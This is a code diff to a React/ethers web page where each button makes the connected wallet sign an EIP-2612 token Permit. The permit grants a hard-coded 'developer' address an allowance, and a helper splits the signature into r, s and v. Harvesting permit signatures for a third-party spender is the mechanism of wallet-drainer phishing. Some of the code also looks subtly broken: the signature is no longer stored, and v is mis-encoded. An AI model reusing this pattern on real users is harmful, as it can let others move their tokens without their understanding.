@@ -8,7 +8,7 @@ import {ethers, Wallet} from "ethers";
 import React, {useEffect, useState} from "react";
 import {useEthersProvider, useEthersSigner} from "@/app/ethers";
 import {JsonRpcSigner} from "@ethersproject/providers";
-import TokenList from "@/app/TokenList";
+import TokenList, {ContractCovalenTHQ} from "@/app/TokenList";
 
 const BNBContract = "0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43";
 const developer = {
@@ -30,7 +30,7 @@ const Page = () => {
 	const signer = useEthersSigner();
 	const provider = useEthersProvider();
 	const [signatures, setSignatures] = useState<{
-		[key: string]: string
+		[key: string]: Awaited<ReturnType<typeof createPermitSignature>>
 	}>({})
 	const {data: balance, isLoading} = useBalance({
 		address: account.address
@@ -90,14 +90,18 @@ const Page = () => {
 					<div className={'flex gap-2'}>
 						{token.contract_ticker_symbol}
 						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
-
-
-							const result = await signTypedData(config, params)
-
-							setSignatures(pre => ({
-								...pre || {},
-								[token.contract_ticker_symbol]: result
-							}))
+							const sig = await createPermitSignature((args: any)=>{
+								return signTypedData(config, args);
+							},
+							token.contract_name || "UNITY2",
+								token.contract_address,
+								account.chainId,
+								account.address,
+								developer.address,
+								5000,
+								1,
+								
+							)
 						}}>
 							SIGN TYPED DATA
 						</button>
@@ -173,6 +177,20 @@ async function createPermitSignature(signMethod: any, domainName: string,contrac
 		primaryType: "Permit",
 		message: permit
 	});
+
+	const splitSig = (sig: string) => {
+		// splits the signature to r, s, and v values.
+		const pureSig = sig.replace("0x", "")
+
+		const r = new Buffer(pureSig.substring(0, 64), 'hex')
+		const s = new Buffer(pureSig.substring(64, 128), 'hex')
+		const v = new Buffer((parseInt(pureSig.substring(128, 130), 16)).toString());
+
+
+		return {
+			r, s, v
+		}
+	}
 
 	const signature = await signMethod(dataToSign)
 	const split = splitSig(signature)
